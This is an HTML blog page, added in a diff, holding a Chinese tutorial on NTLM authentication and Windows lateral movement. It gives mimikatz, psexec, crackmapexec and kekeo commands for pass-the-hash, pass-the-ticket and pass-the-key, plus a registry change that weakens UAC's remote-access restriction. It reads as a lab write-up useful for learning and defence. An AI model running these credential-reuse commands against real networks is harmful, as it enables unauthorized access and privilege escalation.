@@ -1,0 +1,241 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+## NTLM 协议
+
+A 想访问 B, 双方先确定协议版本(NTLM v1/NTLM v2).
+
+A 向 B 发送用户名信息, B 接受到用户名后用该用户的 NTLM Hash 加密 Challenge (8位/16位随机数) 作为 Challenge1 (Net-NTLM v1 Hash/Net-NTLM v2 Hash), 之后将 Challenge 发送给 A.
+
+A 使用登录账号的 NTLM Hash 加密 Challenge 作为 Response 发送给 B.
+
+B 接收到 Response 将其与 Challenge1 进行比对, 一致则为认证通过.
+
+## pth (Pass the Hash)
+
+从 NTLM 协议可以知道, 主机间的访问其实跟明文密码是一点关系也没有的, 正常请求时输入的密码也会被加密成 NTLM Hash, 再生成 Net-NTLM Hash.
+
+由此引申出一个手段, 叫做 `Pass the Hash`, 顾名思义, `pth` 通过目标主机的用户名和 Hash 来访问指定机器.
+
+### mimikatz
+
+```
+sekurlsa::pth /user:administrator /ntlm:aa5c294fbb6f8b8ae6223ba08805894e /domain:WIN7
+```
+
+```
+psexec \\WIN7 whoami
+```
+
+### crackmapexec
+
+```
+crackmapexec WIN7 -u administrator -H aa5c294fbb6f8b8ae6223ba08805894e -d WIN7 -x whoami
+```
+
+### UAC
+
+注意 windows 2008 及以上系统在默认情况下开启 UAC 策略, 不允许 administrator 以外的其它本地管理员用户访问远程资源.
+
+可通过更改注册表关闭 UAC 策略.
+
+域内用户不受此限制.
+
+```
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+```
+
+另有更多工具, 在此不再赘述.
+
+## ptt (Pass the Ticket)
+
+ptt 多用于 Kerberos 协议中, 即域环境内. 例如 Golden Ticket, Silver Ticket 以及 ms14-068 都通过 ptt 方式来提升权限.
+
+ptt 相较于 pth 的好处是它无须本地管理员权限, 默认在 mimikatz 中进行 `sekurlsa::pth` 时须将其以管理员权限运行. 但 ptt 只能用于域环境内, 而 pth 在工作组和域内都可以使用.
+
+ptt 的原理类似于 Golden Ticket, 它通过指定账户的用户名和 Hash 来生成一份高权限的 TGT 以请求不同的 TGS Ticket 来达到访问域内资源的目的.
+
+通过 keko 生成 TGT.
+
+```
+tgt::ask /domain:test.com /user:administrator /ntlm:aa5c294fbb6f8b8ae6223ba08805894e
+```
+
+通过 mimikatz 导入 TGT.
+
+```
+kerberos::ptt ticket.kirbi
+```
+
+## ptk (Pass the Key/Over Pass the Hash)
+
+ptk 为什么没有说呢, 因为自己在本地测试的时候总是不成功. 这里仅给出示例代码.
+
+```
+sekurlsa::pth /user:test /domain:test.com /aes256:54069d7bc9b69fd1a86817bd887f6f4e84a3c858c46081e4b443ab07a52e9a69
+```
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="ntlm">NTLM 协议</h2>
+
+<p>A 想访问 B, 双方先确定协议版本(NTLM v1/NTLM v2).</p>
+
+<p>A 向 B 发送用户名信息, B 接受到用户名后用该用户的 NTLM Hash 加密 Challenge (8位/16位随机数) 作为 Challenge1 (Net-NTLM v1 Hash/Net-NTLM v2 Hash), 之后将 Challenge 发送给 A.</p>
+
+<p>A 使用登录账号的 NTLM Hash 加密 Challenge 作为 Response 发送给 B.</p>
+
+<p>B 接收到 Response 将其与 Challenge1 进行比对, 一致则为认证通过.</p>
+
+<h2 id="pthpassthehash">pth (Pass the Hash)</h2>
+
+<p>从 NTLM 协议可以知道, 主机间的访问其实跟明文密码是一点关系也没有的, 正常请求时输入的密码也会被加密成 NTLM Hash, 再生成 Net-NTLM Hash.</p>
+
+<p>由此引申出一个手段, 叫做 <code>Pass the Hash</code>, 顾名思义, <code>pth</code> 通过目标主机的用户名和 Hash 来访问指定机器.</p>
+
+<h3 id="mimikatz">mimikatz</h3>
+
+<pre><code>sekurlsa::pth /user:administrator /ntlm:aa5c294fbb6f8b8ae6223ba08805894e /domain:WIN7
+</code></pre>
+
+<pre><code>psexec \\WIN7 whoami
+</code></pre>
+
+<h3 id="crackmapexec">crackmapexec</h3>
+
+<pre><code>crackmapexec WIN7 -u administrator -H aa5c294fbb6f8b8ae6223ba08805894e -d WIN7 -x whoami
+</code></pre>
+
+<h3 id="uac">UAC</h3>
+
+<p>注意 windows 2008 及以上系统在默认情况下开启 UAC 策略, 不允许 administrator 以外的其它本地管理员用户访问远程资源.</p>
+
+<p>可通过更改注册表关闭 UAC 策略.</p>
+
+<p>域内用户不受此限制.</p>
+
+<pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</code></pre>
+
+<p>另有更多工具, 在此不再赘述.</p>
+
+<h2 id="pttpasstheticket">ptt (Pass the Ticket)</h2>
+
+<p>ptt 多用于 Kerberos 协议中, 即域环境内. 例如 Golden Ticket, Silver Ticket 以及 ms14-068 都通过 ptt 方式来提升权限.</p>
+
+<p>ptt 相较于 pth 的好处是它无须本地管理员权限, 默认在 mimikatz 中进行 <code>sekurlsa::pth</code> 时须将其以管理员权限运行. 但 ptt 只能用于域环境内, 而 pth 在工作组和域内都可以使用.</p>
+
+<p>ptt 的原理类似于 Golden Ticket, 它通过指定账户的用户名和 Hash 来生成一份高权限的 TGT 以请求不同的 TGS Ticket 来达到访问域内资源的目的.</p>
+
+<p>通过 keko 生成 TGT.</p>
+
+<pre><code>tgt::ask /domain:test.com /user:administrator /ntlm:aa5c294fbb6f8b8ae6223ba08805894e
+</code></pre>
+
+<p>通过 mimikatz 导入 TGT.</p>
+
+<pre><code>kerberos::ptt ticket.kirbi
+</code></pre>
+
+<h2 id="ptkpassthekeyoverpassthehash">ptk (Pass the Key/Over Pass the Hash)</h2>
+
+<p>ptk 为什么没有说呢, 因为自己在本地测试的时候总是不成功. 这里仅给出示例代码.</p>
+
+<pre><code>sekurlsa::pth /user:test /domain:test.com /aes256:54069d7bc9b69fd1a86817bd887f6f4e84a3c858c46081e4b443ab07a52e9a69
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "mimikatz-pth-and-ptt.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
